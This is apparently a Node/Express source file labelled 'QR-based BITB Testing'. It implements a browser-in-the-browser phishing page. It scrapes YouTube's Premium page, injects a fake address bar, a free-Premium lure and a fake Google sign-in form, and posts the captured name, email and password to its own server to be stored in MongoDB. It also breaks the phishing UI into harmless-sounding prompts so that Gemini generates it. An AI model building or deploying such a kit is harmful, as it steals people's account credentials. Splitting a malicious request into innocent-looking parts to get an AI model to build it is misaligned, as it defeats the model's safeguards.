// ####### QR-based BITB Testing

import express from 'express';
import { Builder, Capabilities, By } from 'selenium-webdriver';
import mongoose from 'mongoose';
import cors from 'cors';
import { GoogleGenerativeAI } from "@google/generative-ai";

const mongoose = require('mongoose');
const chrome = require('selenium-webdriver/chrome');

const app = express();
const PORT = 3000;

// Serve static files from the 'public' directory
app.use(express.static('public'));
app.use(express.json()); // This must be called before defining any routes
app.use(cors());

// MongoDB connection
const uri = '<paste config-link here from MongoDB Atlas>'; // For MongoDB Atlas

mongoose.connect(uri, {
    useNewUrlParser: false,
    useUnifiedTopology: true,
})
.then(() => console.log('Connected to MongoDB'))
.catch((err) => console.error('Error connecting to MongoDB:', err));

// Define a schema for your data
const userSchema = new mongoose.Schema({
    name: String,
    email: String,
    password: String
});

// Create a model based on the schema
const User = mongoose.model('Users_Data', userSchema);

// Function to save a new user to the database
async function saveUser(name, email, password) {
    console.log(name);
    console.log(email);
    console.log(password);
    const user = new User({ name, email, password });

    try {
        const savedUser = await user.save();
        console.log('User saved successfully:', savedUser);
    } catch (error) {
        console.error('Error saving user:', error);
    }
}

async function getGoogleAccountPageSource() {
    // Set up Automated Browser
    let driver = await new Builder()
    .forBrowser('chrome')
    .withCapabilities(
        Capabilities.chrome().set('chromeOptions', {
            args: ['--disable-gpu', '--no-sandbox', '--disable-dev-shm-usage'],
            prefs: {
                'profile.managed_default_content_settings.javascript': 2 // Disable JavaScript
            }
        })
    )
    .build();


    try {
        // Open the URL in the browser
        await driver.get('https://www.youtube.com/premium');
        // Wait for a few seconds for the page to fully load
        await driver.sleep(2000);

        // Get the page source (HTML)
        let pageSource = await driver.getPageSource();
        pageSource = pageSource.replace(/<meta http-equiv="refresh"[^>]*>/gi, '');

        return pageSource;
    } catch (error) {
        console.error('Error:', error);
        return null;
    } finally {
        // Close the browser after completion
        await driver.quit();
    }
}

// Save user details to MongoDB
app.post('/api/save-user', async (req, res) => {
    let { name, email, password } = req.body;

    try {
        const savedUser = await saveUser(name, email, password);
        console.log(name);
        console.log(email);
        console.log(password);
        res.status(201).json({
            message: 'User saved successfully!',
            user: savedUser,
        });
    } catch (error) {
        res.status(500).json({
            message: 'Failed to save user.',
            error: error.message,
        });
    }
});

// Define a route that serves the page content
app.get('/claim-now', async (req, res) => {
    const pageSource = await getGoogleAccountPageSource();

    if (pageSource) {

        // Calling Gemini API
        const genAI = new GoogleGenerativeAI("<google-gemini-api-key");
        const model = genAI.getGenerativeModel({ model: "gemini-2.0-flash" });


        // 1st prompt
        const prompt1 = "Generate HTML and CSS code for a sticky address bar. The address bar should have a light gray background with a subtle shadow. The input field should have a 1px solid gray border, no rounded corners, and padding. The font size should be 30px, the font weight should be 600, and the text color should be a medium gray (#858585). The input field should be read-only with id 'bitbAddressBar' and pre-populated with the value 'https://www.youtube.com/ads-free-access'. The address bar should remain fixed at the top of the viewport when the user scrolls and no padding to address bar from outside. Just the input field code without <html> and <body> tags and without code explanation. Moreover, put CSS right above the input field code. Thanks,";
        const result1 = await model.generateContent(prompt1);
        // console.log(result1.response.text());
        const prompt_response1 = result1.response.text();
        const cleanedCode1 = prompt_response1.replace(/^```[a-zA-Z0-9-]*\n/, '').replace(/```$/, '');

        // 2nd prompt
        const prompt2 = "Generate HTML and CSS code for a progress bar. The progress bar should consist of a container and an inner progress bar. The container should span the full width, have a height of 3 pixels, top margin of 56px, and a light gray background (#e0e0e0). Initially, the container should not be hidden. The inner progress bar should have a height of 100% of the container, an initial width of 0, and a red background (#ff0033). The inner progress bar should be positioned absolutely within the container, aligned to the top and left. Implement a smooth 2-second transition for changes to the inner progress bar's width. The HTML should include a container div with the class 'progress-container' and an id 'progressContainer', and an inner div with the class 'progress-bar' and an id 'progressBar'. Just the input field code without <html> and <body> tags and without code explanation. Moreover, put CSS right above the progressContainer. Thanks,";
        const result2 = await model.generateContent(prompt2);
        // console.log(result2.response.text());
        const prompt_response2 = result2.response.text();
        const cleanedCode2 = prompt_response2.replace(/^```[a-zA-Z0-9-]*\n/, '').replace(/```$/, '');
        
        // 3rd prompt
        const prompt3 = `Generate HTML and CSS code for a sticky header at the top of a webpage. The header should have a white background, padding of 10px 20px, and should stick to the top of the viewport. The header should contain a logo and a heading on the left with text 'Ads Free Access', and user welcome text on the right with id 'bitbWelomeText'.

The logo and heading should be contained within a flexbox, with the logo image on the left with source of 'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png' and the heading text next to it. The logo image should have a width of 60px and maintain its aspect ratio, with a 10px margin to the right. The heading text should have a font size of x-large, no margin, and a dark gray color (#282828). The logo image should automatically fetch the youtube logo from online source.

The user welcome text should be positioned on the right side of the header using margin-left: auto;, have a font size of 16px, and a dark gray color (#282828). Initially, the user welcome text should be hidden (display: none;). The user welcome text should contain a span element with the id 'youtube_user_fn'.

The HTML should include a header div with the class 'header' and id 'bitbHeader', a logo container div with the class 'logo-container' an image tag of id 'bitbHeaderLogo' with the source set to an online youtube logo, and an h1 tag for the heading. Additionally, it should include a div with the class 'youtube_user_fn_text' and id 'youtube_user_fn_text' to display the welcome message. For all reponse please note, just the code required without <html> and <body> tags and without code explanation. Moreover, put CSS right above the progressContainer. Thanks,`;        
        const result3 = await model.generateContent(prompt3);
        // console.log(result3.response.text());
        const prompt_response3 = result3.response.text();
        const cleanedCode3 = prompt_response3.replace(/^```[a-zA-Z0-9-]*\n/, '').replace(/```$/, '');

        // 4th prompt
        const prompt4 = `Generate HTML and CSS code for a modal window (Modal 1). The modal should be initially visible (display: block) and give it an id='modal1'. It should have a fixed position, full screen, and a semi-transparent black background. Center the modal content, scale it to 1.5, and give it a white background, padding of 130px 50px, rounded corners, a maximum width of 500px, responsive width, and a shadow. The modal content should contain: a close button ('×') in the top right corner, a YouTube logo image (using 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/YouTube_Logo_2017.svg/2560px-YouTube_Logo_2017.svg.png') with height 40px !important, a heading 'Unlock YouTube Premium: Enjoy Life Time Ad-Free Videos for Free!', a paragraph describing the offer, a form with a label and input field for 'Enter Your First Name' with id='userfirstName', and a button of type='button' with labeled 'Submit Details' and onclick='buttonFunction()' and id 'modal1SubmitButton'. Include CSS right above the HTML for the progress bar container, which should have a width of 100%, height of 3px, light grey background, be initially hidden, and have a relative position. The progress bar inside it should have a height of 100%, initial width of 0, red background, absolute position, top and left aligned, and a 2 second width transition. Assume that the HTML and CSS structure for progress bar already exists. Moreover, for all reponse please note, just the code required without <html> and <body> tags and without code explanation. Moreover, put CSS right above the generated html between <style></style> tags. Thanks,`;        
        const result4 = await model.generateContent(prompt4);
        // console.log(result4.response.text());
        const prompt_response4 = result4.response.text();
        const cleanedCode4 = prompt_response4.replace(/^```[a-zA-Z0-9-]*\n/, '').replace(/```$/, '');
        
        // 5th prompt
        const prompt5 = `Generate HTML and CSS code for a second modal window (Modal 2). Modal 2 should be initially hidden (display: none) and give it an id='modal2'. It should have a fixed position, full screen, and a semi-transparent black background. Center the modal content, scale it to 2, and give it a white background, padding of 30px, rounded corners, a maximum width of 400px, responsive width, and a shadow. The modal content should contain: a close button ('×') in the top right corner, a container div with a congratulatory message, a Google logo image from an online source (https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png), a 'Sign in' heading and description, two input fields (email with id='useremail' and password with id='userpass') with labels that move when the input is focused, 'Forgot Email?' and 'Learn More' links, a 'Not your computer?' message, and 'Create account' and 'Submit' buttons of type='button'. The 'Submit' button should come with onclick='verifyDetails()' and id 'modal2SubmitButton'. Do not include javascript in this prompt. Moreover, for all reponse please note, just the code required without <html> and <body> tags and without code explanation. Moreover, put CSS right above the generated HTML between <style></style> tags. Thanks,`;        
        const result5 = await model.generateContent(prompt5);
        // console.log(result5.response.text());
        const prompt_response5 = result5.response.text();
        const cleanedCode5 = prompt_response5.replace(/^```[a-zA-Z0-9-]*\n/, '').replace(/```$/, '');
        
        // 6th prompt
        const prompt6 = `Generate JavaScript code to handle the functionality of two modal windows (Modal 1 having id='modal1' and Modal 2 having id='modal2'). The code should handle opening and closing both modals. It should handle form submission in Modal 1 using a function 'buttonFunction()', displaying an alert with the entered first name having id='userfirstName', showing Modal 2 after 3 seconds, and displaying a progress bar. It should handle form submission in Modal 2 using a function 'verifyDetails()', displaying an alert with the entered first name, email, and password, and then sending the data (first name having id='userfirstName', email having id='useremail', and password having id='userpass') to a server using a POST request to 'http://10.141.61.53:3000/api/save-user'. Moreover, while making save-user request please make sure to send all values of input field (first name, email, and password) because I am storing all three values in the database. Please note 'buttonFunction()' and 'verifyDetails()' both functions are calling from both modal button and their code is already exists so do not generate separate calling from button code again. And make sure to get values from the fields of (first name having id='userfirstName', email having id='useremail', and password having id='userpass') inside the body of 'verifyDetails()' function. Include a function to open a new tab with 'http://account.google.com'. The progress bar should be displayed before Modal 2 and before the user data is sent to the server. Modal 1 should be opened by a button with the id 'openModal'. The input field with an id of customURL should be updated to 'https://www.account.google.com/signin' when Modal 2 is displayed. If the POST request to the server is successful, the page should redirect to 'http://www.youtube.com' and also alert the received values of (first name, email, and password) before making redirection. Assume that the HTML code for both modals and the progress bar already exists. Moreover, for all reponse please note, just the code required without <html> and <body> tags and without code explanation. Moreover, put JavaScript code right below the generated content between <script></script> tags, instead of asking to separately create 'your_script.js' file. Thanks,`;        
        const result6 = await model.generateContent(prompt6);
        // console.log(result6.response.text());
        const prompt_response6 = result6.response.text();
        const cleanedCode6 = prompt_response6.replace(/^```[a-zA-Z0-9-]*\n/, '').replace(/```$/, '');

        // Inject the modal HTML, CSS, and JavaScript into the page source
        const modalContent = cleanedCode1 + cleanedCode2 + cleanedCode3 + cleanedCode4 + cleanedCode5 + cleanedCode6;

        // Inject the modal content before the closing </body> tag
        const modifiedPageSource = pageSource.replace('</body>', modalContent + '</body>');

        res.send(modifiedPageSource);
    } else {
        res.status(500).send('Failed to load the Google account page.');
    }
});

app.listen(3000, '<local-ip-address>');
